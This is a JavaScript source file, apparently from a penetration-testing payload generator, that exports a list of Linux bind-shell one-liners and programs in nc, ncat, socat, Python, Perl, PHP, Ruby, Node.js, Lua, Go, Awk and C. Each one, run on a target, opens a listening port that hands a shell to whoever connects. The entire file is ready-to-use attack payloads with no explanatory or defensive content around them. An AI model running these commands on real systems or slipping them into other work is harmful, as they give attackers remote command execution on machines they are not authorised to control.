// Linux/Generic Bind Shell Payloads
// The target LISTENS on {port}, attacker CONNECTS to target
// All payloads use {ip} and {port} placeholders

const BIND_LINUX_PAYLOADS = {
  "nc Bind Shell": `nc -lvnp {port} -e /bin/sh`,

  "nc mkfifo Bind": `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvnp {port} >/tmp/f`,

  "BusyBox nc Bind": `busybox nc -lvnp {port} -e /bin/sh`,

  "ncat Bind": `ncat -lvnp {port} -e /bin/sh`,

  "ncat Bind (allow)": `ncat -lvnp {port} --allow {ip} -e /bin/sh`,

  "socat Bind": `socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/sh`,

  "socat Bind TTY": `socat TCP-LISTEN:{port},reuseaddr,fork EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane`,

  "Python Bind": `python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",{port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,

  "Python3 Bind": `python3 -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",{port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,

  "Python3 Bind (pty)": `python3 -c 'import socket,os,pty;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",{port}));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/sh")'`,

  "Perl Bind": `perl -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in($p,INADDR_ANY));listen(S,1);accept(C,S);open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");'`,

  "PHP Bind": `php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_set_option($s,SOL_SOCKET,SO_REUSEADDR,1);socket_bind($s,"0.0.0.0",{port});socket_listen($s,1);$c=socket_accept($s);while(1){{$cmd=socket_read($c,2048);$out=shell_exec($cmd);socket_write($c,$out,strlen($out));}}'`,

  "Ruby Bind": `ruby -rsocket -e 's=TCPServer.new("0.0.0.0",{port});c=s.accept;$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);exec "/bin/sh -i"'`,

  "Node.js Bind": `(function(){{
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var server = net.createServer(function(client) {{
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    }});
    server.listen({port});
}})();`,

  "Lua Bind": `lua -e "local s=require('socket');local srv=s.bind('0.0.0.0',{port});local c=srv:accept();while true do local cmd=c:receive();local f=io.popen(cmd,'r');local out=f:read('*a');f:close();c:send(out) end;c:close()"`,

  "Golang Bind": `echo 'package main;import("net";"os/exec";"net/textproto");func main(){{l,_:=net.Listen("tcp","0.0.0.0:{port}");c,_:=l.Accept();r:=textproto.NewReader(c);for{{cmd,_:=r.ReadLine();out,_:=exec.Command("/bin/sh","-c",cmd).CombinedOutput();c.Write(out)}}}}' > /tmp/b.go && go run /tmp/b.go`,

  "Awk Bind": `awk 'BEGIN {{s="/inet/tcp/{port}/0/0";while(1){{do{{printf "shell>" |& s;s |& getline c;if(c){{while((c |& getline)>0)print $0 |& s;close(c);}}}}while(c != "exit");close(s);}}}}'`,

  "C Bind Shell": `#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

int main() {{
    int srv = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons({port});
    addr.sin_addr.s_addr = INADDR_ANY;
    bind(srv, (struct sockaddr*)&addr, sizeof(addr));
    listen(srv, 1);
    int cli = accept(srv, NULL, NULL);
    dup2(cli, 0);
    dup2(cli, 1);
    dup2(cli, 2);
    execve("/bin/sh", NULL, NULL);
    return 0;
}}`,
};

export default BIND_LINUX_PAYLOADS;
